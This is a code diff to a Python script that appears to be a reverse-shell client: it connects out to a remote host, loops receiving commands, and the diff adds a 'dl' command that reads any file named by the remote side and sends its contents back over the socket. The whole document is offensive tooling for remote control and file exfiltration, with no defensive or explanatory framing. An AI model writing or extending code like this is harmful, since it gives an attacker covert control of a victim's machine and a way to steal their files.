@@ -1,5 +1,6 @@
 import socket, subprocess as sp,sys
 import os, locale
+import base64
 
 #setting local encoding pref
 locenc = locale.getpreferredencoding()
@@ -19,7 +20,18 @@ conn.connect((host,port))
 while True:
     command = conn.recv(1024).decode("utf-8")
     if command != "exit":
-        if command.startswith('cd') :
+        if command.startswith("dl") :
+            file_path = command.split("#")[1]
+            with open(file_path,"rb") as file :
+                data = file.read()
+                #data = base64.b64encode(data)
+                #data=(str(data).replace("b'","").replace("'",""))
+                conn.sendall(data)
+                print("")
+                print ("file has been sent successfully")
+                print("")
+                
+        elif command.startswith('cd') :
             try:
                 os.chdir(command.split(' ')[1])
             except :
